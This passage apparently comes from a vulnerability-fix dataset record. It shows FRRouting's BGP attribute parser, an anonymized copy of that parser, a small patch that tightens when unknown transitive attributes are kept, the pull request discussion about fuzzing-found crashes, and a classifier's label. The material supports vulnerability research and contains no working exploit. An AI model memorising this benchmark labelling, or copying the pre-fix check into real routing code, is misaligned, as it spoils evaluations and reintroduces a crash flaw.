BGP_ATTR_PARSE_ERROR;\n\t\tgoto done;\n\t}\n\n\t/*\n\t * Finally do the checks on the aspath we did not do yet\n\t * because we waited for a potentially synthesized aspath.\n\t */\n\tif (attr->flag & (ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))) {\n\t\tret = bgp_attr_aspath_check(peer, attr);\n\t\tif (ret != BGP_ATTR_PARSE_PROCEED)\n\t\t\tgoto done;\n\t}\n\n\tret = BGP_ATTR_PARSE_PROCEED;\ndone:\n\n\t/*\n\t * At this stage, we have done all fiddling with as4, and the\n\t * resulting info is in attr->aggregator resp. attr->aspath so\n\t * we can chuck as4_aggregator and as4_path alltogether in order\n\t * to save memory\n\t */\n\t/*\n\t * unintern - it is in the hash\n\t * The flag that we got this is still there, but that\n\t * does not do any trouble\n\t */\n\taspath_unintern(&as4_path);\n\n\ttransit = bgp_attr_get_transit(attr);\n\t/* If we received an UPDATE with mandatory attributes, then\n\t * the unrecognized transitive optional attribute of that\n\t * path MUST be passed. Otherwise, it's an error, and from\n\t * security perspective it might be very harmful if we continue\n\t * here with the unrecognized attributes.\n\t */\n\tif (ret == BGP_ATTR_PARSE_PROCEED) {\n\t\t/* Finally intern unknown attribute. */\n\t\tif (transit)\n\t\t\tbgp_attr_set_transit(attr, transit_intern(transit));\n\t\tif (attr->encap_subtlvs)\n\t\t\tattr->encap_subtlvs = encap_intern(attr->encap_subtlvs,\n\t\t\t\t\t\t\t   ENCAP_SUBTLV_TYPE);\n#ifdef ENABLE_BGP_VNC\n\t\tstruct bgp_attr_encap_subtlv *vnc_subtlvs =\n\t\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\t\tif (vnc_subtlvs)\n\t\t\tbgp_attr_set_vnc_subtlvs(\n\t\t\t\tattr,\n\t\t\t\tencap_intern(vnc_subtlvs, VNC_SUBTLV_TYPE));\n#endif\n\t} else {\n\t\tif (transit) {\n\t\t\ttransit_free(transit);\n\t\t\tbgp_attr_set_transit(attr, NULL);\n\t\t}\n\n\t\tbgp_attr_flush_encap(attr);\n\t};\n\n\t/* Sanity checks */\n\ttransit = bgp_attr_get_transit(attr);\n\tif (transit)\n\t\tassert(transit->refcnt > 0);\n\tif (attr->encap_subtlvs)\n\t\tassert(attr->encap_subtlvs->refcnt > 0);\n#ifdef ENABLE_BGP_VNC\n\tstruct bgp_attr_encap_subtlv *vnc_subtlvs =\n\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\tif (vnc_subtlvs)\n\t\tassert(vnc_subtlvs->refcnt > 0);\n#endif\n\n\treturn ret;\n}",
  "abstract_func": "enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,\n\t\t\t\t       bgp_size_t VAR_0,\n\t\t\t\t       struct bgp_nlri *VAR_1,\n\t\t\t\t       struct bgp_nlri *VAR_2)\n{\n\tenum bgp_attr_parse_ret VAR_3;\n\tuint8_t VAR_4 = 0;\n\tuint8_t VAR_5 = 0;\n\tbgp_size_t VAR_6 = 0;\n\tuint8_t *VAR_7, *VAR_8;\n\tuint8_t *VAR_9;\n\tuint8_t VAR_10[VAR_11];\n\t/* COMMENT_0 */\n         \n\t/* COMMENT_2 */\n\tstruct aspath *VAR_12 = NULL;\n\tas_t VAR_13 = 0;\n\tstruct in_addr VAR_14 = {.s_addr = 0};\n\tstruct transit *transit;\n\n\t/* COMMENT_3 */\n\tmemset(VAR_10, 0, VAR_11);\n\n\t/* COMMENT_4 */\n\tVAR_8 = BGP_INPUT_PNT(peer) + VAR_0;\n\n\t/* COMMENT_5 */\n\twhile (BGP_INPUT_PNT(peer) < VAR_8) {\n\t\tVAR_7 = BGP_INPUT_PNT(peer);\n\n\t\t/* COMMENT_6 */\n                                                          \n                                                           \n                                                          \n                                                          \n                                                     \n    \n                                                          \n                                                          \n                                                         \n                                                          \n                                                          \n     \n\n\t\t/* COMMENT_19 */\n\t\tif ((VAR_8 - VAR_7) < VAR_15) {\n\t\t\t/* COMMENT_20 */\n\t\t\tflog_warn(\n\t\t\t\tVAR_16,\n\t\t\t\t\"%s: error BGP attribute length %lu is smaller than min len\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(VAR_8\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != VAR_17) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tVAR_18,\n\t\t\t\t\t\tVAR_19);\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t} else {\n\t\t\t\tVAR_3 = VAR_21;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_21 */\n                                                               \n                                                                 \n              \n     \n\t\tVAR_4 = 0xF0 & stream_getc(BGP_INPUT(peer));\n\t\tVAR_5 = stream_getc(BGP_INPUT(peer));\n\n\t\t/* COMMENT_26 */\n\t\tif (CHECK_FLAG(VAR_4, VAR_22)\n\t\t    && ((VAR_8 - VAR_7) < (VAR_15 + 1))) {\n\t\t\tflog_warn(\n\t\t\t\tVAR_23,\n\t\t\t\t\"%s: Extended length set, but just %lu bytes of attr header\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(VAR_8\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != VAR_17) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tVAR_18,\n\t\t\t\t\t\tVAR_19);\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t} else {\n\t\t\t\tVAR_3 = VAR_21;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_27 */\n\t\tif (CHECK_FLAG(VAR_4, VAR_22))\n\t\t\tVAR_6 = stream_getw(BGP_INPUT(peer));\n\t\telse\n\t\t\tVAR_6 = stream_getc(BGP_INPUT(peer));\n\n\t\t/* COMMENT_28 */\n\t\tVAR_9 = BGP_INPUT_PNT(peer) + VAR_6;\n\n\t\tif (VAR_9 > VAR_8) {\n\t\t\tflog_warn(\n\t\t\t\tVAR_24,\n\t\t\t\t\"%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p\",\n\t\t\t\tpeer->host, VAR_5, VAR_6, VAR_0, VAR_9,\n\t\t\t\tVAR_8);\n\n\t\t\t/* COMMENT_29 */\n\t\t\tif (peer->sort != VAR_17) {\n\t\t\t\t/* COMMENT_30 */\n                   \n                                                   \n                                                     \n                                                   \n                                                    \n                                                        \n                                           \n                 \n                                                           \n                                                        \n                                                   \n                                                         \n                                                      \n      \n                                                           \n                                                           \n                                                         \n                                              \n       \n\t\t\t\tunsigned char VAR_25[peer->max_packet_size];\n\n\t\t\t\tmemset(VAR_25, 0x00, sizeof(VAR_25));\n\t\t\t\tsize_t VAR_26 =\n\t\t\t\t\tCHECK_FLAG(VAR_4, VAR_22) ? 2 : 1;\n\t\t\t\t/* COMMENT_50 */\n\t\t\t\tstream_rewind_getp(BGP_INPUT(peer), (1 + VAR_26));\n\t\t\t\t/* COMMENT_51 */\n\t\t\t\tstream_get(&VAR_25[0], BGP_INPUT(peer), 1);\n\t\t\t\t/* COMMENT_52 */\n\t\t\t\tstream_get(&VAR_25[1], BGP_INPUT(peer), VAR_26);\n\t\t\t\t/* COMMENT_53 */\n\t\t\t\tsize_t VAR_27 = VAR_9 - VAR_7;\n\t\t\t\tsize_t VAR_28 = MIN(VAR_27, STREAM_READABLE(BGP_INPUT(peer)));\n\n\t\t\t\tstream_get(&VAR_25[VAR_26 + 1], BGP_INPUT(peer), VAR_28);\n\n\t\t\t\tbgp_notify_send_with_data(peer->connection,\n\t\t\t\t\t\t\t  VAR_18,\n\t\t\t\t\t\t\t  VAR_19,\n\t\t\t\t\t\t\t  VAR_25, VAR_28 + VAR_26 + 1);\n\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\t/* COMMENT_54 */\n                                                                      \n                                               \n       \n\t\t\t\tflog_warn(\n\t\t\t\t\tVAR_29,\n\t\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\t\tpeer->host, lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\t\tVAR_3 = VAR_21;\n\t\t\t\tstream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));\n\t\t\t\tgoto done;\n\t\t\t}\n\t\t}\n\n\t\t/* COMMENT_58 */\n                                                   \n                                                          \n                                                                  \n                                                              \n     \n\n\t\tif (CHECK_BITMAP(VAR_10, VAR_5)) {\n\t\t\t/* COMMENT_29 */\n\t\t\tif (peer->sort != VAR_17 ||\n\t\t\t\t\tVAR_5 == VAR_31 || VAR_5 == VAR_32) {\n\t\t\t\tflog_warn(\n\t\t\t\t\tVAR_33,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message\",\n\t\t\t\t\tpeer->host, VAR_5);\n\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tVAR_18,\n\t\t\t\t\t\tVAR_34);\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\tflog_warn(\n\t\t\t\t\tVAR_33,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message - discard attribute\",\n\t\t\t\t\tpeer->host, VAR_5);\n\t\t\t\t/* COMMENT_64 */\n                                       \n       \n\t\t\t\tstream_set_getp(BGP_INPUT(peer),\n\t\t\t\t\t(VAR_7 - STREAM_DATA(BGP_INPUT(peer))) + (VAR_9 - VAR_7));\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\t/* COMMENT_67 */\n                                                        \n\n\t\tSET_BITMAP(VAR_10, VAR_5);\n\n\t\tstruct bgp_attr_parser_args VAR_35 = {\n\t\t\t.peer = peer,\n\t\t\t.length = VAR_6,\n\t\t\t.attr = attr,\n\t\t\t.type = VAR_5,\n\t\t\t.flags = VAR_4,\n\t\t\t.startp = VAR_7,\n\t\t\t.total = VAR_9 - VAR_7,\n\t\t};\n\n\n\t\t/* COMMENT_69 */\n                                                                \n       \n                                                                  \n                                           \n\t\tif (bgp_attr_flag_invalid(&VAR_35)) {\n\t\t\tVAR_3 = bgp_attr_malformed(\n\t\t\t\t&VAR_35, VAR_36,\n\t\t\t\tVAR_35.total);\n\t\t\tif (VAR_3 == VAR_37)\n\t\t\t\tcontinue;\n\t\t\tstream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_74 */\n\t\tswitch (VAR_5) {\n\t\tcase VAR_38:\n\t\t\tVAR_3 = bgp_attr_origin(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_39:\n\t\t\tVAR_3 = bgp_attr_aspath(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_40:\n\t\t\tVAR_3 = bgp_attr_as4_path(&VAR_35, &VAR_12);\n\t\t\tbreak;\n\t\tcase VAR_41:\n\t\t\tVAR_3 = bgp_attr_nexthop(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_42:\n\t\t\tVAR_3 = bgp_attr_med(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_43:\n\t\t\tVAR_3 = bgp_attr_local_pref(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_44:\n\t\t\tVAR_3 = bgp_attr_atomic(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_45:\n\t\t\tVAR_3 = bgp_attr_aggregator(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_46:\n\t\t\tVAR_3 = bgp_attr_as4_aggregator(&VAR_35,\n\t\t\t\t\t\t      &VAR_13,\n\t\t\t\t\t\t      &VAR_14);\n\t\t\tbreak;\n\t\tcase VAR_47:\n\t\t\tVAR_3 = bgp_attr_community(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_48:\n\t\t\tVAR_3 = bgp_attr_large_community(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_49:\n\t\t\tVAR_3 = bgp_attr_originator_id(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_50:\n\t\t\tVAR_3 = bgp_attr_cluster_list(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_31:\n\t\t\tVAR_3 = bgp_mp_reach_parse(&VAR_35, VAR_1);\n\t\t\tbreak;\n\t\tcase VAR_32:\n\t\t\tVAR_3 = bgp_mp_unreach_parse(&VAR_35, VAR_2);\n\t\t\tbreak;\n\t\tcase VAR_51:\n\t\t\tVAR_3 = bgp_attr_ext_communities(&VAR_35);\n\t\t\tbreak;\n#ifdef VAR_52\n\t\tcase VAR_53:\n#endif\n\t\tcase VAR_54:\n\t\t\tVAR_3 = bgp_attr_encap(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_55:\n\t\t\tVAR_3 = bgp_attr_prefix_sid(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_56:\n\t\t\tVAR_3 = bgp_attr_pmsi_tunnel(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_57:\n\t\t\tVAR_3 = bgp_attr_ipv6_ext_communities(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_58:\n\t\t\tVAR_3 = bgp_attr_otc(&VAR_35);\n\t\t\tbreak;\n\t\tcase VAR_59:\n\t\t\tVAR_3 = bgp_attr_aigp(&VAR_35);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tVAR_3 = bgp_attr_unknown(&VAR_35);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (VAR_3 == VAR_60) {\n\t\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\t\tVAR_34);\n\t\t\tVAR_3 = VAR_20;\n\t\t\tgoto done;\n\t\t}\n\n\t\tif (VAR_3 == VAR_20) {\n\t\t\tflog_warn(VAR_61,\n\t\t\t\t  \"%s: Attribute %s, parse error\", peer->host,\n\t\t\t\t  lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\tgoto done;\n\t\t}\n\t\tif (VAR_3 == VAR_21) {\n\t\t\tflog_warn(\n\t\t\t\tVAR_29,\n\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\tpeer->host, lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\tstream_forward_getp(BGP_INPUT(peer), VAR_8 - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_75 */\n\t\tif (BGP_INPUT_PNT(peer) != VAR_9) {\n\t\t\tflog_warn(VAR_62,\n\t\t\t\t  \"%s: BGP attribute %s, fetch error\",\n\t\t\t\t  peer->host, lookup_msg(VAR_30, VAR_5, NULL));\n\t\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\t\tVAR_19);\n\t\t\tVAR_3 = VAR_20;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/* COMMENT_76 */\n                                               \n                                    \n                                                              \n                                                             \n                                                   \n                                                                         \n    \n\tif (!attr->mp_nexthop_len || VAR_1->safi != VAR_63)\n\t\tattr->label_index = VAR_64;\n\n\t/* COMMENT_84 */\n\tif (BGP_INPUT_PNT(peer) != VAR_8) {\n\t\tflog_warn(VAR_65,\n\t\t\t  \"%s: BGP attribute %s, length mismatch\", peer->host,\n\t\t\t  lookup_msg(VAR_30, VAR_5, NULL));\n\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\tVAR_19);\n\n\t\tVAR_3 = VAR_20;\n\t\tgoto done;\n\t}\n\n\t/* COMMENT_85 */\n                                                                        \n                                                                     \n                                                                       \n                                                                     \n                                                                         \n                                                              \n   \n                                                                       \n                                                                         \n                                                                         \n                                                                   \n    \n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_41))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_31))) {\n\t\tif (bgp_attr_nexthop_valid(peer, attr) < 0) {\n\t\t\tVAR_3 = VAR_20;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/* COMMENT_98 */\n\tVAR_3 = bgp_attr_check(peer, attr, VAR_6);\n\tif (VAR_3 < 0)\n\t\tgoto done;\n\n\t/* COMMENT_99 */\n                                                           \n                                                         \n                                                               \n                                                                 \n                                                               \n                                  \n                                                                 \n                                                              \n                                                                    \n   \n                                                            \n                    \n    \n\t/* COMMENT_113 */\n                             \n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(VAR_39))\n\t    && bgp_attr_munge_as4_attrs(peer, attr, VAR_12, VAR_13,\n\t\t\t\t\t&VAR_14)) {\n\t\tbgp_notify_send(peer->connection, VAR_18,\n\t\t\t\tVAR_34);\n\t\tVAR_3 = VAR_20;\n\t\tgoto done;\n\t}\n\n\t/* COMMENT_115 */\n                                                         \n                                                           \n    \n\tif (attr->flag & (ATTR_FLAG_BIT(VAR_39))) {\n\t\tVAR_3 = bgp_attr_aspath_check(peer, attr);\n\t\tif (VAR_3 != VAR_37)\n\t\t\tgoto done;\n\t}\n\n\tVAR_3 = VAR_37;\ndone:\n\n\t/* COMMENT_119 */\n                                                              \n                                                               \n                                                                 \n                  \n    \n\t/* COMMENT_125 */\n                                \n                                                      \n                           \n    \n\taspath_unintern(&VAR_12);\n\n\ttransit = bgp_attr_get_transit(attr);\n\t/* COMMENT_130 */\n                                                          \n                                                           \n                                                                \n                                          \n    \n\tif (VAR_3 == VAR_37) {\n\t\t/* COMMENT_136 */\n\t\tif (transit)\n\t\t\tbgp_attr_set_transit(attr, transit_intern(transit));\n\t\tif (attr->encap_subtlvs)\n\t\t\tattr->encap_subtlvs = encap_intern(attr->encap_subtlvs,\n\t\t\t\t\t\t\t   VAR_66);\n#ifdef VAR_67\n\t\tstruct bgp_attr_encap_subtlv *VAR_68 =\n\t\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\t\tif (VAR_68)\n\t\t\tbgp_attr_set_vnc_subtlvs(\n\t\t\t\tattr,\n\t\t\t\tencap_intern(VAR_68, VAR_69));\n#endif\n\t} else {\n\t\tif (transit) {\n\t\t\ttransit_free(transit);\n\t\t\tbgp_attr_set_transit(attr, NULL);\n\t\t}\n\n\t\tbgp_attr_flush_encap(attr);\n\t};\n\n\t/* COMMENT_137 */\n\ttransit = bgp_attr_get_transit(attr);\n\tif (transit)\n\t\tassert(transit->refcnt > 0);\n\tif (attr->encap_subtlvs)\n\t\tassert(attr->encap_subtlvs->refcnt > 0);\n#ifdef VAR_67\n\tstruct bgp_attr_encap_subtlv *VAR_68 =\n\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\tif (VAR_68)\n\t\tassert(VAR_68->refcnt > 0);\n#endif\n\n\treturn VAR_3;\n}",
  "func_graph_path": "FRRouting/frr/6814f2e0138a6ea5e1f83bdd9085d9a77999900b/bgp_attr.c/vul/after/0.json",
  "diff_func": "--- func_before\n+++ func_after\n@@ -450,7 +450,13 @@\n \taspath_unintern(&as4_path);\n \n \ttransit = bgp_attr_get_transit(attr);\n-\tif (ret != BGP_ATTR_PARSE_ERROR) {\n+\t/* If we received an UPDATE with mandatory attributes, then\n+\t * the unrecognized transitive optional attribute of that\n+\t * path MUST be passed. Otherwise, it's an error, and from\n+\t * security perspective it might be very harmful if we continue\n+\t * here with the unrecognized attributes.\n+\t */\n+\tif (ret == BGP_ATTR_PARSE_PROCEED) {\n \t\t/* Finally intern unknown attribute. */\n \t\tif (transit)\n \t\t\tbgp_attr_set_transit(attr, transit_intern(transit));",
  "diff_line_info": {
    "deleted_lines": [
      "\tif (ret != BGP_ATTR_PARSE_ERROR) {"
    ],
    "added_lines": [
      "\t/* If we received an UPDATE with mandatory attributes, then",
      "\t * the unrecognized transitive optional attribute of that",
      "\t * path MUST be passed. Otherwise, it's an error, and from",
      "\t * security perspective it might be very harmful if we continue",
      "\t * here with the unrecognized attributes.",
      "\t */",
      "\tif (ret == BGP_ATTR_PARSE_PROCEED) {"
    ]
  },
  "is_vul": true,
  "pr_url": "https://github.com/FRRouting/frr/pull/14716",
  "description": {
    "pr_info": {
      "title": "bgpd: A couple more bgpd crash fixes for malformed packets ",
      "number": 14716
    },
    "comment": [
      "Found when fuzzing, in the normal case, such packets can't exist at all.",
      "@Mergifyio backport dev/9.1",
      "> backport dev/9.1\n\n#### ✅ Backports have been created\n\n<details>\n\n* [#14735 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14735) has been created for branch `dev/9.1`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport dev/9.1\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
      "Is there a plan for a stable/9.0 backport, too?",
      "@Mergifyio backport stable/9.0",
      "> backport stable/9.0\n\n#### ✅ Backports have been created\n\n<details>\n\n* [#14861 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/14861) has been created for branch `stable/9.0`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/9.0\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->",
      "@Mergifyio backport stable/8.4",
      "> backport stable/8.4\n\n#### ✅ Backports have been created\n\n<details>\n\n* [#15930 bgpd: A couple more bgpd crash fixes for malformed packets  (backport #14716)](https://github.com/FRRouting/frr/pull/15930) has been created for branch `stable/8.4` but encountered conflicts\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4\", \"conclusion\": \"success\", \"action_is_running\": true}\n-*- Mergify Payload End -*-\n-->"
    ]
  },
  "Bug Filter": "Security Vulnerability Fix  \nConfidence Score: 0.95",
  "Bug Filter Confidence": 0.95,
  "Bug Filter Response": "\n\n**Final Output:**\nAnalysis: The patch addresses a security issue where malformed BGP attributes could cause a crash, impacting system availability. The code change introduces a check to prevent processing of unrecognized attributes, mitigating a potential DoS attack.\n\nFinal Classification: Security Vulnerability Fix  \nConfidence Score: 0.95"
}